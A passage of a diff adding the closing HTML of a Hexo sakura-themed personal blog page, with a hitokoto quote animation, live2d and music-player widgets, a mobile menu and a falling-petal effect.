+            setTimeout(momxc, 1000);
+        }
+
+        momxc();
+    </script>
+
+
+
+    <script type="text/javascript">
+        fetch('https://v1.hitokoto.cn')
+            .then(response => response.json())
+            .then(data => {
+                chakhsu(document.getElementById("chakhsu"), data.hitokoto);
+            })
+            .catch(err => console.error(err));
+
+
+        // 文字循环处理 两个参数，第一个是需要显示在哪个标签内append 以id为选择器，第二个参数是 要处理的文字
+        function chakhsu(r, text) {
+            function t() {
+                return b[Math.floor(Math.random() * b.length)];
+            }
+
+            function e() {
+                return String.fromCharCode(94 * Math.random() + 33);
+            }
+
+            function n(r) {
+                for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+                    var l = document.createElement("span");
+                    (l.textContent = e()), (l.style.color = t()), n.appendChild(l);
+                }
+                return n;
+            }
+
+            function i() {
+                var t = o[c.skillI];
+                c.step
+                    ? c.step--
+                    : ((c.step = g),
+                        c.prefixP < l.length
+                            ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++)
+                            : "forward" === c.direction
+                            ? c.skillP < t.length
+                                ? ((c.text += t[c.skillP]), c.skillP++)
+                                : c.delay
+                                    ? c.delay--
+                                    : ((c.direction = "backward"), (c.delay = a))
+                            : c.skillP > 0
+                                ? ((c.text = c.text.slice(0, -1)), c.skillP--)
+                                : ((c.skillI = (c.skillI + 1) % o.length),
+                                    (c.direction = "forward"))),
+                    (r.textContent = c.text),
+                    r.appendChild(
+                        n(
+                            c.prefixP < l.length
+                                ? Math.min(s, s + c.prefixP)
+                                : Math.min(s, t.length - c.skillP)
+                        )
+                    ),
+                    setTimeout(i, d);
+            }
+
+            /*以下内容自定义修改*/
+            var l = "",
+                o = [text].map(function (r) {
+                    return r + "";
+                }),
+                a = 3,
+                g = 1,
+                s = 5,
+                d = 75,
+                b = [
+                    "rgb(110,64,170)",
+                    "rgb(150,61,179)",
+                    "rgb(191,60,175)",
+                    "rgb(228,65,157)",
+                    "rgb(254,75,131)",
+                    "rgb(255,94,99)",
+                    "rgb(255,120,71)",
+                    "rgb(251,150,51)",
+                    "rgb(226,183,47)",
+                    "rgb(198,214,60)",
+                    "rgb(175,240,91)",
+                    "rgb(127,246,88)",
+                    "rgb(82,246,103)",
+                    "rgb(48,239,130)",
+                    "rgb(29,223,163)",
+                    "rgb(26,199,194)",
+                    "rgb(35,171,216)",
+                    "rgb(54,140,225)",
+                    "rgb(76,110,219)",
+                    "rgb(96,84,200)"
+                ],
+                c = {
+                    text: "",
+                    prefixP: -s,
+                    skillI: 0,
+                    skillP: 0,
+                    direction: "forward",
+                    delay: a,
+                    step: g
+                };
+            i();
+        }
+    </script>
+
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/yremp/live2d@1.0/autoload.js"></script>
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">T1h2er3</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="http://github.com/t1h2er3" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+        <a href="https://wpa.qq.com/msgrd?v=3&uin=1078340014&site=qq&menu=yes" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            文章分类
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            兴趣
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  音乐
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    switch="true"
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+  
+  <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+</body>
+</html>
